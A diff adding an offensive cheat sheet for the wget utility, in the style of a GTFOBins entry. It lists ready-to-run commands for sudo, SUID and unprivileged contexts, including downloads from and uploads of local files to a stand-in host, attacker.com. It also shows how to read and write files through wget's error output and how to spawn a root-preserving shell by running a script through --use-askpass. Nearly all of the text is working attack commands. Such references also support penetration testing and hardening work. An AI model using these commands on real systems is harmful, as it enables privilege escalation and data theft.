@@ -1,0 +1,83 @@
+wget
+====
+
+Download
+--------
+
+[Sudo]
+    wget http://attacker.com/path/to/input-file -O /path/to/output-file
+
+[SUID]
+    wget http://attacker.com/path/to/input-file -O /path/to/output-file
+
+[Unprivileged]
+    wget http://attacker.com/path/to/input-file -O /path/to/output-file
+
+File read
+---------
+
+[Sudo]
+    wget -i /path/to/input-file
+    The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages.
+
+[SUID]
+    wget -i /path/to/input-file
+    The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages.
+
+[Unprivileged]
+    wget -i /path/to/input-file
+    The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages.
+
+File write
+----------
+
+[Sudo]
+    wget -i /path/to/input-file -o /path/to/output-file
+    The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages.
+
+[SUID]
+    wget -i /path/to/input-file -o /path/to/output-file
+    The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages.
+
+[Unprivileged]
+    wget -i /path/to/input-file -o /path/to/output-file
+    The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages.
+
+Shell
+-----
+
+[Sudo]
+    echo -e '#!/bin/sh\n/bin/sh 1>&0' >/path/to/temp-file
+chmod +x /path/to/temp-file
+wget --use-askpass=/path/to/temp-file 0
+
+[SUID]
+    echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >/path/to/temp-file
+chmod +x /path/to/temp-file
+wget --use-askpass=/path/to/temp-file 0
+
+[Unprivileged]
+    echo -e '#!/bin/sh\n/bin/sh 1>&0' >/path/to/temp-file
+chmod +x /path/to/temp-file
+wget --use-askpass=/path/to/temp-file 0
+
+Upload
+------
+
+[Sudo]
+    wget --post-file=/path/to/input-file http://attacker.com
+
+[SUID]
+    wget --post-file=/path/to/input-file http://attacker.com
+
+[Unprivileged]
+    wget --post-file=/path/to/input-file http://attacker.com
+
+[Sudo]
+    wget --post-data=DATA http://attacker.com
+
+[SUID]
+    wget --post-data=DATA http://attacker.com
+
+[Unprivileged]
+    wget --post-data=DATA http://attacker.com
